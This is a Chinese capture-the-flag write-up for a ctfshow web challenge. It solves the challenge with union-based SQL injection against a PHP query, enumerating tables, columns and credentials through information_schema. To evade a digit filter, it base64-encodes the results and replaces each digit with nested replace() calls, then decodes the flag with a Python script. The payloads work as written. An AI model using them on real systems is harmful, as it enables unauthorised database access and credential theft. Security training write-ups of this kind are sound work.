#### 链接

[https://blog.csdn.net/solitudi/article/details/110144623]: sql注入	"sql注入byY4tacker"
[https://blog.csdn.net/solitudi/article/details/109446561]: 
[https://www.cnblogs.com/tianyu0125/p/14006275.html]: 



查询语句

```mysql
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```



返回逻辑

```php
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```



payload

返回不能有数字

```mysql
//判断注入
1' and 1=1--+

//判断字段
1' order by 2--+

返回不能有数字
//判段数据库
1' union select user(),database()--+
root@localhost			ctfshow_web

//判断table
替换table_name结果中的数字再base64解码
to_base64('1') 也可以替换成database()等超全局变量 只要结果没有字符串就可以

1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(table_name),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),to_base64('1') from information_schema.tables where table_schema=database()--+

YnumCRmcnumBhvdnumAnumInumAcnumBVyNA==
替换num数字
Y3Rmc2hvd191c2VyNA==
结果
ctfshow_user4

//判断字段

1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(column_name),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),database() from information_schema.columns where table_name='ctfshow_user4'--+

aWQ=(id)											ctfshow_web
dXNlcmnumEhbWU=										ctfshow_web
dXNlcm5hbWU=(username)
cGFzcnumCdvcmQ=										ctfshow_web
cGFzc3dvcmQ=(password)



//判断内容
MYSQL中的base64方式和hex方式
hex数据用16进制转字符串就可以解码

replace置换方法绕过数字
将base64过后的字符串再替换他的数字部分
replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ')

1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ') from ctfshow_user4 where username='flag'--+

ZmxhZw==   (flag)		ZmxhZnumCsnumDOTRiMmInumDNCnumAmNjMnumELTQzODQtOWIxNynumJnumBMDdhNjRmMGNjNjJnumI


python 替换numA-J为数字的脚本

import base64

flag = 'ZmxhZnumCsnumDOTRiMmInumDNCnumAmNjMnumELTQzODQtOWIxNynumJnumBMDdhNjRmMGNjNjJnumI'

result = base64.b64decode(flag.replace('numA','1').replace('numB','2').replace('numC','3').replace('numD','4').replace('numE','5').replace('numF','6').replace('numG','7').replace('numH','8').replace('numI','9').replace('numJ','0'))
print(result)

b'flag{894b2b84-f639-4384-9b17-607a64f0cc62}'
```

